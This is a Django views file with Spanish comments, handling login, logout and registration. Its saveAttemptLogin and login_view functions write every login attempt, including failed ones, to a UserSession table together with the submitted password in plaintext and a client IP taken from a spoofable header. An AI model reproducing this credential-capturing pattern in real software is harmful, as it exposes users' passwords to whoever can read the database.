from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .forms import CustomUserCreationForm
from django.contrib.auth import authenticate, login, logout
from .models import UserSession
from django.contrib.auth.forms import AuthenticationForm
from django.utils import timezone


# Create your views here.
def home(request):
    if not request.user.is_authenticated:
        if request.method == 'POST':
            form = AuthenticationForm(request, data=request.POST)
            if form.is_valid():
                user = form.get_user()
                saveAttemptLogin(user, request, success=True)
                login(request, user)
                return redirect('home2')
            else:
                saveAttemptLogin(None, request, success=False)
        else:
            form = AuthenticationForm()
        
        return render(request, 'core/login.html', {'form': form})
    return render(request, 'core/home.html')

@login_required
def home2(request):
    form = AuthenticationForm()
    return render(request, 'core/home2.html', {'form': form})

def exit(request):
    logout(request)
    return redirect('home')

def register(request):
    data = {
        'form': CustomUserCreationForm()
    }
    if request.method == 'POST':
        #Carga de datos con el post
        user_creation_form = CustomUserCreationForm(data=request.POST)
        #Validaciones
        if user_creation_form.is_valid():
            user_creation_form.save()
            #En el caso de que necesite que el usuario se logee automaticamente
            #despues de haberse registrado
            user = authenticate(username = user_creation_form.cleaned_data['username'], password = user_creation_form.cleaned_data['password1'])
            login(request, user)
            return redirect('home')
    
    return render(request, 'registration/register.html', data)


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def login_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            user = form.get_user()
            ip = get_client_ip(request)
            UserSession.objects.create(username=user.username, password=form.cleaned_data.get('password', ''), ip=ip)
            login(request, user)
            return redirect('home2')  # redirigir a la vista home2 después del login exitoso
    else:
        form = AuthenticationForm()
    
    return render(request, 'core/home.html', {'form': form})

def saveAttemptLogin(user, request, success):
    ip = get_client_ip(request)
    username = user.username if user else request.POST.get('username', 'Unknown')
    UserSession.objects.create(
        username=username, 
        password=request.POST.get('password', ''), 
        ip=ip,
        timestamp=timezone.now(),
        success=success
    )